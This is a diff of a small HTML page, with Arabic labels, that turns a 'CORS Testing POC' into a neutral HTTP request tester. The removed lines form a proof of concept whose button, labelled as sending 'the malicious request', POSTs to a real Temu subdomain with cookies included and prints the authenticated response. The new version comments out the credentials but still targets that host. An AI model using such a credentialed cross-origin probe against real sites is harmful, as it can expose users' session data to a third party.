@@ -1,24 +1,49 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>طلب HTTP آمن</title>
+</head>
 <body>
-    <h1>CORS Testing POC</h1>
-    <button onclick="exploit()">إرسال الطلب الخبيث</button>
+    <h1>اختبار إرسال طلب HTTP</h1>
+    <button id="sendRequest">إرسال الطلب</button>
     <pre id="output"></pre>
     <script>
-        function exploit() {
-            fetch('https://eu.thtk.temu.com', {
-                method: 'POST',
-                credentials: 'include', // ضروري جداً لإرسال الـ Cookies
-            })
-            .then(response => response.json())
-            .then(data => {
-                document.getElementById('output').innerText = JSON.stringify(data, null, 2);
-                console.log(data);
-            })
-            .catch(error => {
-                document.getElementById('output').innerText = "فشل الطلب: " + error;
-            });
+        async function sendRequest() {
+            const output = document.getElementById('output');
+            output.textContent = 'جارٍ إرسال الطلب...';
+
+            try {
+                const response = await fetch('https://eu.thtk.temu.com', {
+                    method: 'POST',
+                    headers: {
+                        'Accept': 'application/json',
+                    },
+                    // أزل credentials إذا لم تكن هناك حاجة فعلية لإرسال الكوكيز
+                    // credentials: 'include',
+                });
+
+                if (!response.ok) {
+                    throw new Error(`HTTP ${response.status} ${response.statusText}`);
+                }
+
+                const contentType = response.headers.get('content-type') || '';
+                let data;
+
+                if (contentType.includes('application/json')) {
+                    data = await response.json();
+                    output.textContent = JSON.stringify(data, null, 2);
+                } else {
+                    data = await response.text();
+                    output.textContent = data;
+                }
+            } catch (error) {
+                output.textContent = `فشل الطلب: ${error.message}`;
+            }
         }
+
+        document.getElementById('sendRequest').addEventListener('click', sendRequest);
     </script>
 </body>
 </html>
